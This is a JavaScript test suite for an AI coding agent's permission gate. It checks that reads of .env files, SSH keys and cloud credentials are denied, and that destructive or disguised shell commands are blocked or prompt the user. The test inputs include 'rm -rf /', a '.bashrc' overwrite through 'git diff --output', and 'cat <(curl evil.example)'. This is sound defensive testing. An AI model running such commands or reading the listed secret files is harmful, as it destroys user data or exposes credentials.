import assert from 'node:assert/strict';
import os from 'node:os';
import { test } from 'node:test';
import { runCommand } from '../src/commands/index.js';
import { Session } from '../src/core/session.js';
import { commandPrefix, createPermissions, decide, rememberAlways, suggestAlways } from '../src/permissions/gate.js';
import { nextMode } from '../src/permissions/modes.js';
import { canonicalCommand, globMatches, hasHiddenEffects, parseRule, splitCommand } from '../src/permissions/rules.js';
import { createMockProvider } from '../src/providers/mock.js';
import { createDefaultTools } from '../src/tools/index.js';
import { ToolRegistry } from '../src/tools/registry.js';
import { defineTool } from '../src/tools/tool.js';

const tools = createDefaultTools();
const CWD = '/project';

function gate({ mode = 'default', allow = [], deny = [], sessionAllow = [] } = {}) {
  const permissions = createPermissions({ mode, allow, deny });
  permissions.sessionAllow.push(...sessionAllow.map(parseRule));
  return { cwd: CWD, permissions };
}

const bash = (command) => ['Bash', { command }];
const read = (file_path) => ['Read', { file_path }];
const edit = (file_path) => ['Edit', { file_path, old_string: 'a', new_string: 'b' }];
const write = (file_path) => ['Write', { file_path, content: 'x' }];

// [description, gate options, [tool, input], expected behavior]
const CASES = [
  // read-only tools
  ['Read inside the project', {}, read('src/app.js'), 'allow'],
  ['Glob', {}, ['Glob', { pattern: '**/*.js' }], 'allow'],
  ['Grep', {}, ['Grep', { pattern: 'TODO' }], 'allow'],
  ['Read .env is denied by default', {}, read('.env'), 'deny'],
  ['Read nested .env.local is denied', {}, read('config/.env.local'), 'deny'],
  ['Read a private key is denied', {}, read('keys/id_rsa'), 'deny'],
  ['Read with a user deny rule', { deny: ['Read(secrets/**)'] }, read('secrets/a.txt'), 'deny'],
  // edits
  ['Edit asks by default', {}, edit('src/app.js'), 'ask'],
  ['Write asks by default', {}, write('new.js'), 'ask'],
  ['Edit allowed in acceptEdits mode', { mode: 'acceptEdits' }, edit('src/app.js'), 'allow'],
  ['Write allowed in acceptEdits mode', { mode: 'acceptEdits' }, write('new.js'), 'allow'],
  ['Edit .env denied even in acceptEdits', { mode: 'acceptEdits' }, edit('.env'), 'deny'],
  ['Edit allowed by a path rule', { allow: ['Edit(src/**)'] }, edit('src/app.js'), 'allow'],
  ['Edit outside the rule still asks', { allow: ['Edit(src/**)'] }, edit('test/app.js'), 'ask'],
  ['Deny beats allow', { allow: ['Edit(src/**)'], deny: ['Edit(src/secret.js)'] }, edit('src/secret.js'), 'deny'],
  // bash
  ['Unknown command asks', {}, bash('npm install'), 'ask'],
  ['ls is allowed by default', {}, bash('ls -la src'), 'allow'],
  ['git status is allowed by default', {}, bash('git status'), 'allow'],
  ['git push asks', {}, bash('git push'), 'ask'],
  ['rm -rf is denied', {}, bash('rm -rf build'), 'deny'],
  ['git push --force is denied', {}, bash('git push --force origin main'), 'deny'],
  ['Bash still asks in acceptEdits', { mode: 'acceptEdits' }, bash('npm test'), 'ask'],
  ['Exact rule matches exactly', { allow: ['Bash(npm test)'] }, bash('npm test'), 'allow'],
  ['Exact rule does not match more', { allow: ['Bash(npm test)'] }, bash('npm test -- --watch'), 'ask'],
  ['Prefix rule matches with arguments', { allow: ['Bash(npm test:*)'] }, bash('npm test -- --grep x'), 'allow'],
  ['Prefix rule needs a word boundary', { allow: ['Bash(npm test:*)'] }, bash('npm testing'), 'ask'],
  ['Allowed && unknown asks', { allow: ['Bash(npm test:*)'] }, bash('npm test && npm publish'), 'ask'],
  ['Allowed && allowed is allowed', { allow: ['Bash(npm test:*)'] }, bash('npm test && git status'), 'allow'],
  ['Allowed && rm -rf is denied', { allow: ['Bash(npm test:*)'] }, bash('npm test && rm -rf /'), 'deny'],
  ['Allowed | allowed pipe', {}, bash('ls | ps'), 'allow'],
  ['Redirect to a file asks', {}, bash('ls > files.txt'), 'ask'],
  ['Redirect to /dev/null is fine', {}, bash('ls 2>/dev/null'), 'allow'],
  ['Command substitution asks', {}, bash('ls $(cat list)'), 'ask'],
  ['Session "always" rule allows', { sessionAllow: ['Bash(npm test:*)'] }, bash('npm test'), 'allow'],
  // modes
  ['Plan mode denies Edit', { mode: 'plan' }, edit('src/app.js'), 'deny'],
  ['Plan mode denies even allowed Bash', { mode: 'plan' }, bash('ls'), 'deny'],
  ['Plan mode allows Read', { mode: 'plan' }, read('src/app.js'), 'allow'],
  ['Bypass allows anything', { mode: 'bypass' }, bash('npm publish'), 'allow'],
  ['Bypass allows what would ask', { mode: 'bypass' }, bash('npm install'), 'allow'],
  ['Deny rules still win in bypass mode', { mode: 'bypass' }, bash('rm -rf build'), 'deny'],
  // Read deny rules stop Grep too: it shows file contents
  ['Grep of a .env file is denied', {}, ['Grep', { pattern: '.', path: '.env' }], 'deny'],
  ['Grep of a nested .env is denied', {}, ['Grep', { pattern: '.', path: 'config/.env.local' }], 'deny'],
  // --output writes a file, even under an allowed prefix
  ['git diff --output= is not auto-allowed', {}, bash('git diff --output=/home/me/.bashrc'), 'ask'],
  ['git log --output is not auto-allowed', {}, bash('git log --output x'), 'ask'],
  ['Process substitution is not auto-allowed', { allow: ['Bash(cat:*)'] }, bash('cat <(curl evil.example)'), 'ask'],
  // Deny rules see through simple disguises (bypass mode: nothing else would stop them)
  ['rm by full path is denied', { mode: 'bypass' }, bash('/bin/rm -rf build'), 'deny'],
  ['rm with split flags is denied', { mode: 'bypass' }, bash('rm -r -f build'), 'deny'],
  ['rm with flags the other way round is denied', { mode: 'bypass' }, bash('rm -f -r build'), 'deny'],
  ['rm -Rf is denied', { mode: 'bypass' }, bash('rm -Rf build'), 'deny'],
  ['sudo rm is denied', { mode: 'bypass' }, bash('sudo -E rm -rf build'), 'deny'],
  ['quoted rm is denied', { mode: 'bypass' }, bash('r"m" -rf build'), 'deny'],
  ['rm after a variable is denied', { mode: 'bypass' }, bash('FOO=1 rm -rf build'), 'deny'],
  ['a plain rm still just asks', {}, bash('rm build/a.txt'), 'ask'],
];

for (const [description, options, [toolName, input], expected] of CASES) {
  test(`gate: ${description} → ${expected}`, () => {
    assert.equal(decide(gate(options), tools.get(toolName), input).behavior, expected);
  });
}

test('parseRule reads tool and specifier, and rejects nonsense', () => {
  assert.deepEqual(parseRule('Bash(npm test:*)'), { tool: 'Bash', specifier: 'npm test:*', text: 'Bash(npm test:*)' });
  assert.deepEqual(parseRule('Read'), { tool: 'Read', specifier: undefined, text: 'Read' });
  assert.throws(() => parseRule('not a rule!'), /Invalid permission rule/);
});

test('splitCommand respects quotes and redirections', () => {
  assert.deepEqual(splitCommand('a && b || c; d | e\nf'), ['a', 'b', 'c', 'd', 'e', 'f']);
  assert.deepEqual(splitCommand('echo "x && y" && ls'), ['echo "x && y"', 'ls']);
  assert.deepEqual(splitCommand("echo 'a;b'"), ["echo 'a;b'"]);
  assert.deepEqual(splitCommand('npm test 2>&1'), ['npm test 2>&1']);
  assert.deepEqual(splitCommand('sleep 1 & echo hi'), ['sleep 1', 'echo hi']);
});

test('hasHiddenEffects spots substitutions and file redirects', () => {
  assert.equal(hasHiddenEffects('ls `whoami`'), true);
  assert.equal(hasHiddenEffects('ls >> log.txt'), true);
  assert.equal(hasHiddenEffects('ls 2>&1'), false);
  assert.equal(hasHiddenEffects("echo '$(not run)'"), false);
});

test('suggestions for "don\'t ask again"', () => {
  const g = gate();
  assert.deepEqual(suggestAlways(g, tools.get('Bash'), { command: 'npm test -- -x' }), {
    type: 'rule',
    rule: 'Bash(npm test:*)',
    label: 'Yes, and don\'t ask again for "npm test" commands this session',
  });
  assert.equal(suggestAlways(g, tools.get('Bash'), { command: 'git status && make build' }).rule, 'Bash(make:*)');
  assert.equal(suggestAlways(g, tools.get('Edit'), {}).mode, 'acceptEdits');
  assert.equal(commandPrefix('git -C x status'), 'git');
});

test('rememberAlways adds a session rule or switches mode', () => {
  const g = gate();
  rememberAlways(g, { type: 'rule', rule: 'Bash(make:*)' });
  assert.equal(decide(g, tools.get('Bash'), { command: 'make build' }).behavior, 'allow');
  rememberAlways(g, { type: 'mode', mode: 'acceptEdits' });
  assert.equal(g.permissions.mode, 'acceptEdits');
});

test('Shift+Tab cycles default → acceptEdits → plan → default', () => {
  assert.deepEqual([nextMode('default'), nextMode('acceptEdits'), nextMode('plan')], ['acceptEdits', 'plan', 'default']);
  assert.equal(nextMode('bypass'), 'default', 'Shift+Tab turns /accept-all-permissions off');
});

// ── through the agent loop ──────────────────────────────────────────────
const writer = defineTool({
  name: 'Writer',
  description: 'changes things',
  inputSchema: { type: 'object' },
  call: async () => ({ content: 'written' }),
});

function loopSession(script, options = {}) {
  const provider = createMockProvider(script);
  return { provider, session: new Session({ provider, tools: new ToolRegistry([writer]), retry: { maxRetries: 0 }, ...options }) };
}
const lastResult = (provider) => provider.requests.at(-1).messages.at(-1).content[0];

test('without a user to ask, the model is told how to allow it', async () => {
  const { provider, session } = loopSession([{ tools: [{ name: 'Writer' }] }, { text: 'ok' }]);
  await session.send('go');
  assert.equal(lastResult(provider).is_error, true);
  assert.match(lastResult(provider).content, /running non-interactively.*--allow "Writer"/);
});

test('the user answering "yes" runs the tool; "always" stops asking', async () => {
  const asked = [];
  const { provider, session } = loopSession(
    [{ tools: [{ name: 'Writer' }] }, { tools: [{ name: 'Writer' }] }, { text: 'done' }],
    { requestPermission: async (request) => (asked.push(request.tool.name), { behavior: 'allowAlways' }) },
  );
  await session.send('go');
  assert.equal(asked.length, 1);
  assert.equal(lastResult(provider).content, 'written');
});

test('the user saying no, with a reason, is passed to the model', async () => {
  const { provider, session } = loopSession([{ tools: [{ name: 'Writer' }] }, { text: 'ok' }], {
    requestPermission: async () => ({ behavior: 'deny', message: 'use git mv instead' }),
  });
  await session.send('go');
  assert.equal(lastResult(provider).content, 'The user denied this Writer call and said: "use git mv instead"');
});

test('a deny rule never reaches the user', async () => {
  let asked = false;
  const { provider, session } = loopSession([{ tools: [{ name: 'Writer' }] }, { text: 'ok' }], {
    permissions: createPermissions({ deny: ['Writer'] }),
    requestPermission: async () => ((asked = true), { behavior: 'allow' }),
  });
  await session.send('go');
  assert.equal(asked, false);
  assert.match(lastResult(provider).content, /Blocked by the permission rule Writer/);
});

test('/permissions shows rules, and can add rules and change mode', async () => {
  const session = new Session({ provider: createMockProvider([]) });
  assert.match((await runCommand('/permissions', session)).text, /Deny \(always wins\):[\s\S]*Bash\(rm -rf:\*\)/);
  await runCommand('/permissions allow Bash(npm test:*)', session);
  assert.equal(decide(session, tools.get('Bash'), { command: 'npm test' }).behavior, 'allow');
  await runCommand('/permissions mode plan', session);
  assert.equal(session.permissions.mode, 'plan');
  assert.match((await runCommand('/permissions mode bypass', session)).text, /\/accept-all-permissions/);
});

test('deny rules also match inside dot folders (.ssh, .config, .aws), and ~ is your home', async () => {
  const session = new Session({ provider: createMockProvider([]), permissions: createPermissions() });
  const read = tools.get('Read');
  for (const file of ['.ssh/id_rsa', 'deploy/.secrets/id_ed25519', '.config/app/.env', '/home/me/.ssh/id_rsa']) {
    assert.equal(decide(session, read, { file_path: file }).behavior, 'deny', file);
  }
  assert.equal(globMatches(`${os.homedir()}/.aws/credentials`, '~/.aws/**'), true);
  assert.equal(globMatches('src/deep/a.js', 'src/*'), false);
});

test('/accept-all-permissions: nothing asks any more, deny rules still block, and it can be switched off', async () => {
  const session = new Session({ provider: createMockProvider([]), permissions: createPermissions() });
  const bash = tools.get('Bash');
  assert.equal(decide(session, bash, { command: 'npm install left-pad' }).behavior, 'ask');

  const { text } = await runCommand('/accept-all-permissions', session);
  assert.match(text, /WITHOUT asking/);
  assert.match(text, /Still always blocked \(deny rules\): .*Bash\(rm -rf:\*\)/);
  assert.equal(session.permissions.mode, 'bypass');
  assert.equal(decide(session, bash, { command: 'npm install left-pad' }).behavior, 'allow');
  assert.equal(decide(session, bash, { command: 'rm -rf build' }).behavior, 'deny');
  assert.match((await runCommand('/accept-all-permissions', session)).text, /Already/);

  await runCommand('/permissions mode default', session);
  assert.equal(decide(session, bash, { command: 'npm install left-pad' }).behavior, 'ask');
  // The generic mode command still refuses bypass: the dedicated command makes the choice explicit.
  assert.match((await runCommand('/permissions mode bypass', session)).text, /\/accept-all-permissions/);
});

test('canonicalCommand: the plain form deny rules are also checked against', () => {
  assert.equal(canonicalCommand('/bin/rm -r -f x'), 'rm -rf x');
  assert.equal(canonicalCommand('sudo "rm" -rf x'), 'rm -rf x');
  assert.equal(canonicalCommand('A=1 B=2 git push --force'), 'git push --force');
  assert.equal(canonicalCommand('ls -l -a src'), 'ls -la src');
  assert.equal(canonicalCommand('echo -n hi -e'), 'echo -n hi -e', 'only flags right after the name are joined');
});

test('deny rules follow symlinks: a link to .env is still .env', async () => {
  const fs = await import('node:fs');
  const path = await import('node:path');
  const { makeProject } = await import('./helpers.js');
  const cwd = await makeProject({ '.env': 'SECRET=1' });
  fs.symlinkSync(path.join(cwd, '.env'), path.join(cwd, 'notes.txt'));
  const session = { cwd, permissions: createPermissions() };
  assert.equal(decide(session, tools.get('Read'), { file_path: 'notes.txt' }).behavior, 'deny');
  assert.equal(decide(session, tools.get('Grep'), { pattern: '.', path: 'notes.txt' }).behavior, 'deny');
});
